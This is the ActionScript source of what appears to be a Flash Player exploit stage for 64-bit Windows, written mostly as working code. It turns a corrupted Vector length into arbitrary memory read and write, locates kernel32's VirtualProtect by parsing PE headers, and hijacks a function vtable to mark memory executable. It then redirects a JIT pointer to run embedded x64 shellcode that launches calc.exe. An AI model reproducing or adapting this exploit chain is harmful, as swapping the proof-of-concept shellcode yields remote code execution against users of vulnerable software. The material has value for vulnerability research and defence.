package
{
	import flash.utils.ByteArray;
	import flash.utils.Endian;
	
	class ShellWin64 extends MyClass
	{
		static var
			_v:Vector.<uint>,	// uint vector with corrupted length
			_vAddr:Number,		// _v[0] address
			_base:Number,
			_baseMax:Number,
			_baseOld:Number,
			_mc:MyClass2,		// descendant of ByteArray allocated right after _v[]
			_mcOffs:uint,		// index of mc.o1 within _v[]
			N32:Number 			= Math.pow(2,32),
			
			// x64 shellcode 
			_x64:Vector.<uint> = Vector.<uint>([			
				// searches and calls CreateProcessA("calc.exe",...) and returns rax as uint atom
				0xC4834855, 0xEC8B4880, 0x65575153, 0x25048B48, 0x00000060, 0x18408B48, 0x10408B48, 0x48008B48,
				0x8B48008B, 0x438B3058, 0xD801483C, 0x0088908B, 0x01480000, 0x207A8BDA, 0x48DF0148, 0x078BC931,
				0x81D80148, 0x65724338, 0x81217561, 0x73730B78, 0x18750041, 0x4824428B, 0xB70FD801, 0x7A8B4804,
				0xDF01481C, 0x48873C8B, 0x0CEBFB01, 0x04C78348, 0x3BC1FF48, 0xC67C184A, 0x48E08948, 0x0008E081,
				0x29480000, 0x485050C4, 0x5000458D, 0x187D8D48, 0xC0314857, 0x00000DB9, 0xAB48F300, 0x681845C7,
				0xE8000000, 0x00000009, 0x636C6163, 0x6578652E, 0x31485A00, 0x515151C9, 0xC9894951, 0x48C88949,
				0x4820EC83, 0x8348D3FF, 0xC14850C4, 0x834803E0, 0x595906C0, 0x5FCC0148, 0x8D485B59, 0x000080A5,
				0x90C35D00
				
				/*/ "empty" payload // returns 12345678
				0x90909090,
				0x614EB848, 0x000000BC, 	// mov rax, 0xBC614E;
				0xC1480000, 0x834803E0, 	// shl rax,3; add rax,6;	// rax as int atom
				0x90C306C0					// ret*/
			]);
			
		// converts two uints to hex string
		static function Hex(n:Number):String
		{
			if (n >= 0 && n <= 9) return n.toString() 
			else return "0x" + n.toString(16);
		}			
		
		// init global vars
		static function Init(v:Vector.<uint>, offs:uint, mc:MyClass2, mcOffs:uint):Boolean
		{
			_v = v; _mc = mc; _mcOffs = mcOffs;
			
			_vAddr = Get64(mcOffs, 0xfffff000) - offs + 0x10;
			_baseOld = Get64(mcOffs-10);
			logAdd("v[0] address = " + Hex(_vAddr));
			logAdd("mc old base = " + Hex(_baseOld));
			
			// prepare new base for mc
			v[6] = 0xffffffff; // ByteArray::capacity
			v[7] = 0xfffffffe; // ByteArray::length
			mc.endian = Endian.LITTLE_ENDIAN;
			
			// set new base
			Set64(mcOffs-10, _vAddr);
			_base = 0;
			_baseMax = 0xfffffff0;
			
			// check results
			var len:uint = mc.length;
			logAdd("mc.length = " + Hex(len));
			return len == v[7];
		}		
		
		// restores corrupted memory
		static function CleanUp()
		{
			// restore _v.length
			Set32(_vAddr - 0x10, 0x3f0);
			
			_v[6] = 0; // _mc.capacity
			_v[7] = 0; // _mc.length
		}
		
		// join two uints as uint64
		static function Num(low:uint, hi:uint):Number
		{
			var n:Number = hi;
			if (n != 0) n *= N32;
			n += low;
			return n;
		}
		
		// get high uint from uint64
		static function Hi(n:Number):uint
		{	
			return uint(Math.floor(n / N32) & (N32-1));
		}
		
		// get low uint from uint64
		static function Low(n:Number):uint
		{	
			return uint(n & (N32-1));
		}
		
		// reads uint64 from _v[]
		static function Get64(offs:uint, mask:uint = 0xffffffff):Number
		{
			return Num(_v[offs] & mask, _v[offs+1]);
		}
			
		// writes uint64 into _v[]
		static function Set64(offs:uint, n:Number)
		{
			_v[offs] = Low(n);
			_v[offs+1] = Hi(n);
		}
			
		// sets new address pointer for _mc[0]
		static function SetBase(addr:Number)
		{
			if (addr < _base || addr >= _baseMax) {
				Set64(4, addr); // _v[4],[5]
				_base = addr;
				_baseMax = addr + 0xfffffff0;
			}
		}
		
		// reads uint from the memory address
		static function Get32(addr:Number):uint
		{
		 	if (addr < 0x10000) throw new Error("Get32() at addr = " + Hex(addr)); // bad pointer
			
			SetBase(addr);
			_mc.position = uint((addr - _base) & (N32-1));
			return _mc.readUnsignedInt();
		}
		
		// writes uint into the memory address
		static function Set32(addr:Number, u:uint)
		{
		 	if (addr < 0x10000) throw new Error("Set32() to addr = " + Hex(addr)); // bad pointer
			
			SetBase(addr);
			_mc.position = uint((addr - _base) & (N32-1));
			_mc.writeUnsignedInt(u);
		}	
		
		// reads uint64 from the memory address
		static function Get(addr:Number):Number
		{
		 	if (addr < 0x10000) throw new Error("Get() at addr = " + Hex(addr)); // bad pointer
			
			SetBase(addr);
			_mc.position = uint((addr - _base) & (N32-1));
			var lo:uint = _mc.readUnsignedInt();
			var hi:uint = _mc.readUnsignedInt();
			return Num(lo,hi);
		}
		
		// writes uint64 into the memory address
		static function Set(addr:Number, n:Number)
		{
		 	if (addr < 0x10000) throw new Error("Set() to addr = " + Hex(addr)); // bad pointer
			
			SetBase(addr);
			_mc.position = uint((addr - _base) & (N32-1));
			_mc.writeUnsignedInt(Low(n));
			_mc.writeUnsignedInt(Hi(n));
		}		
		
		// returns object's address 
		static function GetAddr(obj:Object):Number
		{
			_mc.o1 = obj;
			return Get64(_mcOffs) - 1; // atom decrement
		}
		
		// get memory dump // for RnD
		static function Dump(addr:Number, len:uint):String
		{
			var str:String = "";
			for(var i:uint; i < len; i++, addr+=8) {
				str += Get(addr).toString(16) + ",";
				if (i % 8 == 7) str += "<br>";
			}
			return str;
		}
		
		// searches for the kernel32.VirtualProtect() address
		static function FindVP():Number
		{ 
			try 
			{
				// find IMAGE_DOS_HEADER
				var b:Number = Get64(_mcOffs-4, 0xffff0000) - 0x800000;
				for(var i:uint; i < 0xf0; i++, b -= 0x10000){
					// check 'MZ'
					if (uint(Get32(b) & 0xffff) == 0x5a4d) { /*logAdd("mz offset = " + i);*/ break; } 
				}
				if (i >= 0xf0) throw new Error("can't find MZ at " + Hex(b));
				
				// get IMAGE_NT_HEADERS
				var n:Number = b + Get32(b + 0x3c);
				// check 'PE'
				if (Get32(n) != 0x4550) throw new Error("can't find PE at " + Hex(n));
				
				// get IMAGE_IMPORT_DIRECTORY
				var size:uint = Get32(n + 0x94);
				n = b + Get32(n + 0x90); 
				
				// find kernel32.dll
				var v:Vector.<uint> = new Vector.<uint>(4);
				var oft:Number, ft:Number, str:Number, k:uint;
				
				for(i=0; i < size; i += 5*4){
					// read dll name into vector
					str = b + Get32(n + i + 3*4); 
					for(k=0; k < 4; k++, str+=4) v[k] = Get32(str);
					
					// check dll name
					if (MyUtils.IsEqual(v, "KERNEL32.DLL")) {
						oft = Get32(n + i); 
						ft = Get32(n + i + 4*4); 
						break;
					}
				}
				
				if (oft == 0 || ft == 0) throw new Error("can't find kernel32");
				
				// find VirtualProtect() address
				v.length = 5; oft += b;
				for(i=0; i < 0x180; i++, oft+=8){
					// get proc name
					str = Get(oft);
					if (str == 0) throw new Error("can't find VirtualProtect"); 
					str += b;
					for(k=0; k < 5; k++, str+=4) v[k] = Get32(str); 
					
					// check proc name
					if (MyUtils.IsEqual(v, "VIRTUALPROTECT", 2) && (MyUtils._bArr.readByte() == 0))
						return Get(b + ft + i*8);
				}
			} 
			catch (e:Error) 
			{
				logAdd("FindVP() " + e.toString());
			}
			
			return 0;
		}
		
		// declare dummy victim function
		static function Payload(...a){}
		
		// corrupts Payload function and calls VirtualProtect()
		static function CallVP(vp:Number):Number
		{
			// generate Payload() function object
			Payload();
			var args:Array = new Array(4);	
			Payload.apply(null, args);
			
			// find vtable pointer in Payload() object
			var p:Number = GetAddr(Payload);
			var ptbl:Number = Get(Get(Get(p + 0x10) + 0x28) + 8) + (_isDbg ? 0x120:0x108); // see Function.apply() in IDA64 for offset values
			// save original pointers
			var p1:Number = Get(ptbl);
			var p2:Number = Get(p+0x38);
			var p3:Number = Get(p+0x40);
			var p4:Number = Get(p1-8);
			//logAdd(Hex(p) + ": " + Dump(p,16) + "<br>" + Hex(p1) + ", " + Hex(p2) + ", " + Hex(p3));
			
			// allocate storage for payload and get his address
			var len:uint = _x64.length;
			var v:Vector.<uint> = new Vector.<uint>(Math.max(0x300, len));
			var vAddr:Number = GetAddr(v);
			logAdd("x64[] object = " + Hex(vAddr));
			vAddr += _isDbg ? 0x38 : 0x30;
			if (Get(vAddr) < 0x10000) vAddr -= 8; // for FP 11.4
			vAddr = Get(vAddr) + 0x10;
			logAdd("x64[] data = " + Hex(vAddr));	
			_gc.push(v);

			// create copy of vtable
			for(var i:uint; i < 0x100-2; i++) v[i+2] = Get32(p1 + i*4);
			var p11:Number = Get(p1) - 0x40*4;
			for(i=0; i < 0x200; i++) v[i+0x100] = Get32(p11 + i*4);
			// set new vtable pointer 
			v[0] = Low(p4); 
			v[1] = Hi(p4);
			v[2] = Low(vAddr + 0x140*4); 
			v[3] = Hi (vAddr + 0x140*4); 
			// redirect one method pointer to VirtualProtect() // see Function.apply() in IDA64
			v[0x140 + 12] = Low(vp); 
			v[0x140 + 13] = Hi(vp); 
			
			// set second arg for VirtualProtect()
			Set(p+0x38, v.length*4);
			// set third arg = 0x40 PAGE_EXECUTE_READWRITE
			Set(p+0x40, 0x40);
			// set fourth arg
			var pa:Number = GetAddr(args);
			p4 = Get(pa); // save old val
			
			// replace vtable pointer in Payload() and set first arg for VirtualProtect()
			Set(ptbl, vAddr+8);
			
			// call VirtualProtect()
			Payload.apply(null, args);
			
			// restore old pointers
			Set(ptbl, p1);
			Set(p+0x38, p2);
			Set(p+0x40, p3);
			
			// check results
			logAdd("VirtualProtect() result = " + Hex(Get32(pa)));
			p3 = Get(pa);
			Set(pa, p4);
			if (p4 == p3) throw new Error("VirtualProtect() error");
			
			// copy _x64[] into v[]
			for(i=0; i < len; i++) v[i] = _x64[i];
	
			// return pointer to payload
			return vAddr;
		}
		
		//
		static function Exec()
		{										
			try 
			{									
				// get kernel32.VirtualProtect() address
				var vpAddr:Number = FindVP();
				logAdd("VirtualProtect() address = " + Hex(vpAddr));
				if (vpAddr == 0) throw new Error("vpAddr == 0");
				
				// call VirtualProtect()
				var xAddr:Number = CallVP(vpAddr);		
				
				// find Payload JIT code pointer
				var payAddr:Number = GetAddr(Payload);
				logAdd("Payload() object = " + Hex(payAddr));
				payAddr = Get(Get(payAddr + 0x38) + 0x10) + 8;
				var old:Number = Get(payAddr);
				//logAdd("Payload() address = " + Hex(payAddr));
				
				// replace JIT pointer by payload pointer
				Set(payAddr, xAddr);		
				
				// call x64 payload
				var res = Payload.call(null);
				logAdd("CreateProcessA() returns " + res + (res == 0 ? " (in sandbox)":""));
					
				// restore old pointer
				Set(payAddr, old);
			}
			catch (e:Error) 
			{
				logAdd("Exec() " + e.toString());
			}
			
			CleanUp();
		}

	}

}